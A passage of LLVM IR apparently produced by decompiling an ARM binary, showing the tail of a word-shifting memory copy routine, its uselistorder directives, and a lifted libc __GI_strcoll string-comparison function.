  %v3_184b4 = mul i32 %v12_184ac, 65536
  %v4_184b8 = udiv i32 %v9_184ac, 65536
  %v5_184b8 = or i32 %v3_184b4, %v4_184b8
  store i32 %v5_184b8, i32* @ip, align 4
  %v3_184bc = mul i32 %v9_184ac, 65536
  %v4_184c0 = udiv i32 %v6_184ac, 65536
  %v5_184c0 = or i32 %v3_184bc, %v4_184c0
  store i32 %v5_184c0, i32* %r5.global-to-local, align 4
  %v3_184c4 = mul i32 %v6_184ac, 65536
  %v4_184c8 = udiv i32 %v3_184ac, 65536
  %v5_184c8 = or i32 %v3_184c4, %v4_184c8
  store i32 %v5_184c8, i32* %r4.global-to-local, align 4
  %v1_184cc = add i32 %v0_184cc, -16
  %v2_184cc = inttoptr i32 %v1_184cc to i32*
  store i32 %v5_184c8, i32* %v2_184cc, align 4
  %v4_184cc = add i32 %v0_184cc, -12
  %v5_184cc = inttoptr i32 %v4_184cc to i32*
  %v6_184cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_184cc, i32* %v5_184cc, align 4
  %v7_184cc = add i32 %v0_184cc, -8
  %v8_184cc = inttoptr i32 %v7_184cc to i32*
  %v9_184cc = load i32, i32* @ip, align 4
  store i32 %v9_184cc, i32* %v8_184cc, align 4
  %v10_184cc = add i32 %v0_184cc, -4
  %v11_184cc = inttoptr i32 %v10_184cc to i32*
  %v12_184cc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_184cc, i32* %v11_184cc, align 4
  store i32 %v1_184cc, i32* %r0.global-to-local, align 4
  %v0_184d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_184d0 = add i32 %v0_184d0, -16
  store i32 %v2_184d0, i32* %r2.global-to-local, align 4
  %v6_184d4 = icmp slt i32 %v0_184d0, 16
  br i1 %v6_184d4, label %dec_label_pc_184d8, label %dec_label_pc_184a8.dec_label_pc_184a8_crit_edge

dec_label_pc_184a8.dec_label_pc_184a8_crit_edge:  ; preds = %dec_label_pc_184a8
  %v0_184a8.pre = load i32, i32* @r3, align 4
  %v0_184ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_184a8

dec_label_pc_184d8:                               ; preds = %dec_label_pc_184a8
  %v2_184d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_184d8, i32* @r4, align 4
  %v5_184d8 = load i8*, i8** %stack_var_-8, align 4
  %v6_184d8 = ptrtoint i8* %v5_184d8 to i32
  store i32 %v6_184d8, i32* @r5, align 4
  store i32 %v11_184a4, i32* @lr, align 4
  %v2_184dc = add i32 %v0_184d0, -4
  store i32 %v2_184dc, i32* %r2.global-to-local, align 4
  %v4_184dc = add i32 %v0_184d0, 2147483632
  %v5_184dc = and i32 %v2_184dc, %v4_184dc
  %v6_184dc = icmp slt i32 %v5_184dc, 0
  store i1 %v6_184dc, i1* %cpsr_v.global-to-local, align 1
  %v7_184dc = icmp slt i32 %v2_184dc, 0
  store i1 %v7_184dc, i1* %cpsr_n.global-to-local, align 1
  %v8_184dc = icmp eq i32 %v2_184dc, 0
  store i1 %v8_184dc, i1* %cpsr_z.global-to-local, align 1
  %v5_184e0 = icmp slt i32 %v2_184d0, -12
  br i1 %v5_184e0, label %dec_label_pc_184fc, label %dec_label_pc_184e4

dec_label_pc_184e4:                               ; preds = %dec_label_pc_184d8, %dec_label_pc_18498, %dec_label_pc_184e4
  %v1_184f0 = phi i32 [ %v5_184f0, %dec_label_pc_184e4 ], [ %v1_184cc, %dec_label_pc_184d8 ], [ %v0_1846019, %dec_label_pc_18498 ]
  %v0_184e4 = load i32, i32* @r3, align 4
  %v3_184e4 = mul i32 %v0_184e4, 65536
  store i32 %v3_184e4, i32* %ip.global-to-local, align 4
  %v0_184e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_184e8 = add i32 %v0_184e8, -4
  %v2_184e8 = inttoptr i32 %v1_184e8 to i32*
  %v3_184e8 = load i32, i32* %v2_184e8, align 4
  store i32 %v3_184e8, i32* @r3, align 4
  store i32 %v1_184e8, i32* %r1.global-to-local, align 4
  %v4_184ec = udiv i32 %v3_184e8, 65536
  %v5_184ec = or i32 %v4_184ec, %v3_184e4
  store i32 %v5_184ec, i32* @ip, align 4
  %v2_184f0 = add i32 %v1_184f0, -4
  %v3_184f0 = inttoptr i32 %v2_184f0 to i32*
  store i32 %v5_184ec, i32* %v3_184f0, align 4
  %v4_184f0 = load i32, i32* %r0.global-to-local, align 4
  %v5_184f0 = add i32 %v4_184f0, -4
  store i32 %v5_184f0, i32* %r0.global-to-local, align 4
  %v0_184f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_184f4 = add i32 %v0_184f4, -4
  store i32 %v2_184f4, i32* %r2.global-to-local, align 4
  %v6_184f8 = icmp slt i32 %v0_184f4, 4
  br i1 %v6_184f8, label %dec_label_pc_184fc.loopexit, label %dec_label_pc_184e4

dec_label_pc_184fc.loopexit:                      ; preds = %dec_label_pc_184e4
  %v4_184f4 = sub i32 3, %v0_184f4
  %v5_184f4 = and i32 %v4_184f4, %v0_184f4
  %v6_184f4 = icmp slt i32 %v5_184f4, 0
  %v7_184f4 = icmp slt i32 %v2_184f4, 0
  store i1 %v6_184f4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_184f4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_184fc

dec_label_pc_184fc:                               ; preds = %dec_label_pc_184fc.loopexit, %dec_label_pc_184d8
  %v2_183d452 = phi i32 [ %v5_184f0, %dec_label_pc_184fc.loopexit ], [ %v1_184cc, %dec_label_pc_184d8 ]
  %v0_183c448 = phi i32 [ %v2_184f4, %dec_label_pc_184fc.loopexit ], [ %v2_184dc, %dec_label_pc_184d8 ]
  %v0_184fc = load i32, i32* %r1.global-to-local, align 4
  %v1_184fc = add i32 %v0_184fc, 2
  store i32 %v1_184fc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_18504:                               ; preds = %dec_label_pc_18418
  br i1 %v5_18508, label %dec_label_pc_18550, label %dec_label_pc_1850c

dec_label_pc_1850c:                               ; preds = %dec_label_pc_18504
  store i32 %v2_18504, i32* %r2.global-to-local, align 4
  %v3_18510 = load i32, i32* @r4, align 4
  store i32 %v3_18510, i32* %stack_var_-12, align 4
  %v6_18510 = load i32, i32* @r5, align 4
  %v8_18510 = inttoptr i32 %v6_18510 to i8*
  store i8* %v8_18510, i8** %stack_var_-8, align 4
  %v11_18510 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18514

dec_label_pc_18514:                               ; preds = %dec_label_pc_18514.dec_label_pc_18514_crit_edge, %dec_label_pc_1850c
  %v0_18538 = phi i32 [ %v1_18538, %dec_label_pc_18514.dec_label_pc_18514_crit_edge ], [ %v0_1846019, %dec_label_pc_1850c ]
  %v0_18518 = phi i32 [ %v0_18518.pre, %dec_label_pc_18514.dec_label_pc_18514_crit_edge ], [ %v1_18418, %dec_label_pc_1850c ]
  %v0_18514 = phi i32 [ %v0_18514.pre, %dec_label_pc_18514.dec_label_pc_18514_crit_edge ], [ %v2_1841c, %dec_label_pc_1850c ]
  %v3_18514 = mul i32 %v0_18514, 16777216
  store i32 %v3_18514, i32* %lr.global-to-local, align 4
  %v1_18518 = add i32 %v0_18518, -4
  %v2_18518 = inttoptr i32 %v1_18518 to i32*
  %v3_18518 = load i32, i32* %v2_18518, align 4
  store i32 %v3_18518, i32* @r3, align 4
  %v4_18518 = add i32 %v0_18518, -8
  %v5_18518 = inttoptr i32 %v4_18518 to i32*
  %v6_18518 = load i32, i32* %v5_18518, align 4
  store i32 %v6_18518, i32* %r4.global-to-local, align 4
  %v7_18518 = add i32 %v0_18518, -12
  %v8_18518 = inttoptr i32 %v7_18518 to i32*
  %v9_18518 = load i32, i32* %v8_18518, align 4
  store i32 %v9_18518, i32* %r5.global-to-local, align 4
  %v10_18518 = add i32 %v0_18518, -16
  %v11_18518 = inttoptr i32 %v10_18518 to i32*
  %v12_18518 = load i32, i32* %v11_18518, align 4
  store i32 %v10_18518, i32* %r1.global-to-local, align 4
  %v4_1851c = udiv i32 %v12_18518, 256
  %v5_1851c = or i32 %v4_1851c, %v3_18514
  store i32 %v5_1851c, i32* %lr.global-to-local, align 4
  %v3_18520 = mul i32 %v12_18518, 16777216
  %v4_18524 = udiv i32 %v9_18518, 256
  %v5_18524 = or i32 %v3_18520, %v4_18524
  store i32 %v5_18524, i32* @ip, align 4
  %v3_18528 = mul i32 %v9_18518, 16777216
  %v4_1852c = udiv i32 %v6_18518, 256
  %v5_1852c = or i32 %v3_18528, %v4_1852c
  store i32 %v5_1852c, i32* %r5.global-to-local, align 4
  %v3_18530 = mul i32 %v6_18518, 16777216
  %v4_18534 = udiv i32 %v3_18518, 256
  %v5_18534 = or i32 %v3_18530, %v4_18534
  store i32 %v5_18534, i32* %r4.global-to-local, align 4
  %v1_18538 = add i32 %v0_18538, -16
  %v2_18538 = inttoptr i32 %v1_18538 to i32*
  store i32 %v5_18534, i32* %v2_18538, align 4
  %v4_18538 = add i32 %v0_18538, -12
  %v5_18538 = inttoptr i32 %v4_18538 to i32*
  %v6_18538 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18538, i32* %v5_18538, align 4
  %v7_18538 = add i32 %v0_18538, -8
  %v8_18538 = inttoptr i32 %v7_18538 to i32*
  %v9_18538 = load i32, i32* @ip, align 4
  store i32 %v9_18538, i32* %v8_18538, align 4
  %v10_18538 = add i32 %v0_18538, -4
  %v11_18538 = inttoptr i32 %v10_18538 to i32*
  %v12_18538 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18538, i32* %v11_18538, align 4
  store i32 %v1_18538, i32* %r0.global-to-local, align 4
  %v0_1853c = load i32, i32* %r2.global-to-local, align 4
  %v2_1853c = add i32 %v0_1853c, -16
  store i32 %v2_1853c, i32* %r2.global-to-local, align 4
  %v6_18540 = icmp slt i32 %v0_1853c, 16
  br i1 %v6_18540, label %dec_label_pc_18544, label %dec_label_pc_18514.dec_label_pc_18514_crit_edge

dec_label_pc_18514.dec_label_pc_18514_crit_edge:  ; preds = %dec_label_pc_18514
  %v0_18514.pre = load i32, i32* @r3, align 4
  %v0_18518.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18514

dec_label_pc_18544:                               ; preds = %dec_label_pc_18514
  %v2_18544 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18544, i32* @r4, align 4
  %v5_18544 = load i8*, i8** %stack_var_-8, align 4
  %v6_18544 = ptrtoint i8* %v5_18544 to i32
  store i32 %v6_18544, i32* @r5, align 4
  store i32 %v11_18510, i32* @lr, align 4
  %v2_18548 = add i32 %v0_1853c, -4
  store i32 %v2_18548, i32* %r2.global-to-local, align 4
  %v4_18548 = add i32 %v0_1853c, 2147483632
  %v5_18548 = and i32 %v2_18548, %v4_18548
  %v6_18548 = icmp slt i32 %v5_18548, 0
  store i1 %v6_18548, i1* %cpsr_v.global-to-local, align 1
  %v7_18548 = icmp slt i32 %v2_18548, 0
  store i1 %v7_18548, i1* %cpsr_n.global-to-local, align 1
  %v8_18548 = icmp eq i32 %v2_18548, 0
  store i1 %v8_18548, i1* %cpsr_z.global-to-local, align 1
  %v5_1854c = icmp slt i32 %v2_1853c, -12
  br i1 %v5_1854c, label %dec_label_pc_18568, label %dec_label_pc_18550

dec_label_pc_18550:                               ; preds = %dec_label_pc_18544, %dec_label_pc_18504, %dec_label_pc_18550
  %v1_1855c = phi i32 [ %v5_1855c, %dec_label_pc_18550 ], [ %v1_18538, %dec_label_pc_18544 ], [ %v0_1846019, %dec_label_pc_18504 ]
  %v0_18550 = load i32, i32* @r3, align 4
  %v3_18550 = mul i32 %v0_18550, 16777216
  store i32 %v3_18550, i32* %ip.global-to-local, align 4
  %v0_18554 = load i32, i32* %r1.global-to-local, align 4
  %v1_18554 = add i32 %v0_18554, -4
  %v2_18554 = inttoptr i32 %v1_18554 to i32*
  %v3_18554 = load i32, i32* %v2_18554, align 4
  store i32 %v3_18554, i32* @r3, align 4
  store i32 %v1_18554, i32* %r1.global-to-local, align 4
  %v4_18558 = udiv i32 %v3_18554, 256
  %v5_18558 = or i32 %v4_18558, %v3_18550
  store i32 %v5_18558, i32* @ip, align 4
  %v2_1855c = add i32 %v1_1855c, -4
  %v3_1855c = inttoptr i32 %v2_1855c to i32*
  store i32 %v5_18558, i32* %v3_1855c, align 4
  %v4_1855c = load i32, i32* %r0.global-to-local, align 4
  %v5_1855c = add i32 %v4_1855c, -4
  store i32 %v5_1855c, i32* %r0.global-to-local, align 4
  %v0_18560 = load i32, i32* %r2.global-to-local, align 4
  %v2_18560 = add i32 %v0_18560, -4
  store i32 %v2_18560, i32* %r2.global-to-local, align 4
  %v6_18564 = icmp slt i32 %v0_18560, 4
  br i1 %v6_18564, label %dec_label_pc_18568.loopexit, label %dec_label_pc_18550

dec_label_pc_18568.loopexit:                      ; preds = %dec_label_pc_18550
  %v4_18560 = sub i32 3, %v0_18560
  %v5_18560 = and i32 %v4_18560, %v0_18560
  %v6_18560 = icmp slt i32 %v5_18560, 0
  %v7_18560 = icmp slt i32 %v2_18560, 0
  store i1 %v6_18560, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18560, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18568

dec_label_pc_18568:                               ; preds = %dec_label_pc_18568.loopexit, %dec_label_pc_18544
  %v2_183d453 = phi i32 [ %v5_1855c, %dec_label_pc_18568.loopexit ], [ %v1_18538, %dec_label_pc_18544 ]
  %v0_183c449 = phi i32 [ %v2_18560, %dec_label_pc_18568.loopexit ], [ %v2_18548, %dec_label_pc_18544 ]
  %v0_18568 = load i32, i32* %r1.global-to-local, align 4
  %v1_18568 = add i32 %v0_18568, 1
  store i32 %v1_18568, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1855c, { 0, 2, 1 }
  uselistorder i32 %v3_18550, { 1, 0 }
  uselistorder i32 %v2_18548, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18538, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18518, { 1, 0 }
  uselistorder i32 %v3_18514, { 1, 0 }
  uselistorder i32 %v0_18518, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18538, { 3, 2, 1, 0 }
  uselistorder i32 %v5_184f0, { 0, 2, 1 }
  uselistorder i32 %v3_184e4, { 1, 0 }
  uselistorder i32 %v2_184dc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_184cc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_184ac, { 1, 0 }
  uselistorder i32 %v3_184a8, { 1, 0 }
  uselistorder i32 %v0_184ac, { 3, 2, 1, 0 }
  uselistorder i32 %v0_184cc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18484, { 0, 2, 1 }
  uselistorder i32 %v3_18478, { 1, 0 }
  uselistorder i32 %v2_18470, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18460, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18440, { 1, 0 }
  uselistorder i32 %v3_1843c, { 1, 0 }
  uselistorder i32 %v0_18440, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18460, { 3, 2, 1, 0 }
  uselistorder i1 %v5_18508, { 2, 0, 1 }
  uselistorder i32 %v0_18420, { 1, 0 }
  uselistorder i32 %v0_1850c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1846019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18410, { 2, 1, 0 }
  uselistorder i32 %v0_18410, { 2, 0, 1 }
  uselistorder i32 %v2_18408, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18408, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18408, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1846020, { 2, 1, 0 }
  uselistorder i32 %v11_183e4, { 1, 0 }
  uselistorder i32 %v7_183e4, { 1, 0 }
  uselistorder i32 %v1_183c4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_183c4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_183c8, { 1, 0 }
  uselistorder i32 %v7_183bc, { 0, 2, 1 }
  uselistorder i32 %v10_183b8, { 1, 0 }
  uselistorder i32 %v9_183b0, { 1, 0, 2 }
  uselistorder i32 %v6_183ac, { 1, 0 }
  uselistorder i32 %v2_183a4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_183a4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_183b4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18398, { 0, 2, 1 }
  uselistorder i32 %v13_18394, { 1, 0 }
  uselistorder i32 %v4_18390, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_18390, { 2, 0, 1 }
  uselistorder i32 %v6_18398, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18388, { 0, 2, 1 }
  uselistorder i32 %v16_18384, { 1, 0 }
  uselistorder i32 %v4_18380, { 1, 2, 0 }
  uselistorder i32 %v0_18390.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18388, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18374, { 0, 3, 2, 1 }
  uselistorder i32 %v10_18370, { 1, 0 }
  uselistorder i32 %v1_1836c, { 1, 0 }
  uselistorder i32 %v10_18368, { 1, 0 }
  uselistorder i32 %v0_18368, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1836c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_18360, { 0, 2, 1 }
  uselistorder i32 %v2_18354, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18354, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1836c37, { 1, 2, 0 }
  uselistorder i32 %v1_1834c, { 2, 1, 0 }
  uselistorder i32 %v1_18344, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1833c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18338, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18334, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18334, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_18324, { 0, 2, 1 }
  uselistorder i32 %v4_18320, { 1, 0 }
  uselistorder i32 %v3_18314, { 1, 0 }
  uselistorder i32 %v1_1830c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18300, { 1, 0 }
  uselistorder i32 %v12_182fc, { 0, 2, 1 }
  uselistorder i32 %v8_182dc, { 1, 0, 2 }
  uselistorder i32 %v5_182dc, { 1, 0, 2 }
  uselistorder i32 %v2_182dc, { 1, 0, 2 }
  uselistorder i32 %v0_182dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_182fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_182b8, { 0, 2, 1 }
  uselistorder i32 %v4_182b4, { 1, 0 }
  uselistorder i32 %v3_182a8, { 1, 0 }
  uselistorder i32 %v1_182a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18294, { 1, 0 }
  uselistorder i32 %v12_18290, { 0, 2, 1 }
  uselistorder i32 %v8_18270, { 1, 0, 2 }
  uselistorder i32 %v5_18270, { 1, 0, 2 }
  uselistorder i32 %v2_18270, { 1, 0, 2 }
  uselistorder i32 %v0_18270, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18290, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1824c, { 0, 2, 1 }
  uselistorder i32 %v4_18248, { 1, 0 }
  uselistorder i32 %v3_1823c, { 1, 0 }
  uselistorder i32 %v1_18234, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18228, { 1, 0 }
  uselistorder i32 %v12_18224, { 0, 2, 1 }
  uselistorder i32 %v8_18204, { 1, 0, 2 }
  uselistorder i32 %v5_18204, { 1, 0, 2 }
  uselistorder i32 %v2_18204, { 1, 0, 2 }
  uselistorder i32 %v0_18204, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18224, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_18260, { 0, 2, 1 }
  uselistorder i32 %v1_1825c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_181e0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_181e0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18264, { 1, 0, 3, 2 }
  uselistorder i32 %v0_182fc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_181d4, { 1, 0 }
  uselistorder i32 %v0_181d4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_181cc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_181cc, { 1, 0, 2 }
  uselistorder i32 %v0_181cc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_182fc77, { 1, 0 }
  uselistorder i32 %v1_181ac, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_181b4, { 1, 0 }
  uselistorder i32 %v0_18188, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1817c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_18168, { 1, 0, 2 }
  uselistorder i32 %v1_18164, { 1, 0 }
  uselistorder i32 %v1_1815c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1815c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18154, { 0, 2, 1 }
  uselistorder i32 %v3_18154, { 3, 0, 1, 2 }
  uselistorder i1 %v0_18154, { 1, 0 }
  uselistorder i1 %v1_18154, { 1, 0 }
  uselistorder i32 %v3_18150, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18148, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18134, { 1, 2, 0 }
  uselistorder i32 %v1_1812c, { 0, 2, 1 }
  uselistorder i32 %v12_18128, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1811c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18120, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_18110, { 0, 2, 1 }
  uselistorder i32 %v1_18108, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18108, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_18100, { 1, 0 }
  uselistorder i32 %v1_180f8, { 2, 1, 0 }
  uselistorder i32 %v2_180f0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_180f0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_180ec, { 1, 0 }
  uselistorder i32 %v2_180e0, { 1, 0 }
  uselistorder i32 %v1_180e0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_180e0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_18550, { 2, 0, 1 }
  uselistorder label %dec_label_pc_184e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18418, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_183a4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_18368, { 1, 0 }
  uselistorder label %dec_label_pc_18354, { 1, 0 }
  uselistorder label %dec_label_pc_18314, { 2, 0, 1 }
  uselistorder label %dec_label_pc_182a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1823c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_181dc, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_181ac, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_18148, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_18108, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_18574.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_18574 = phi i32 [ %v0_18574.pre, %bb ], [ %v5_18574, %bb3 ]
  %v0_18570 = phi i32 [ %tmp, %bb ], [ %v5_18570, %bb3 ]
  %v1_18570 = inttoptr i32 %v0_18570 to i8*
  %v2_18570 = load i8, i8* %v1_18570, align 1
  %v1_18574 = inttoptr i32 %v0_18574 to i8*
  %v2_18574 = load i8, i8* %v1_18574, align 1
  %v3_18574 = zext i8 %v2_18574 to i32
  %v2_18578 = icmp eq i8 %v2_18570, 0
  br i1 %v2_18578, label %.dec_label_pc_18584_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_18574 = add i32 %v0_18574, 1
  %v5_18570 = add i32 %v0_18570, 1
  %v3_18570 = zext i8 %v2_18570 to i32
  %v10_1857c = icmp eq i8 %v2_18570, %v2_18574
  br i1 %v10_1857c, label %entry, label %dec_label_pc_18584

.dec_label_pc_18584_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_18584

dec_label_pc_18584:                               ; preds = %bb3, %.dec_label_pc_18584_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_18584_crit_edge ], [ %v3_18570, %bb3 ]
  %v2_18584.pre-phi = sub nsw i32 %.pn, %v3_18574
  ret i32 %v2_18584.pre-phi

; uselistorder directives
  uselistorder i8 %v2_18570, { 0, 2, 1 }
  uselistorder i32 %v0_18570, { 1, 0 }
  uselistorder i32 %v0_18574, { 1, 0 }
  uselistorder label %dec_label_pc_18584, { 1, 0 }
}

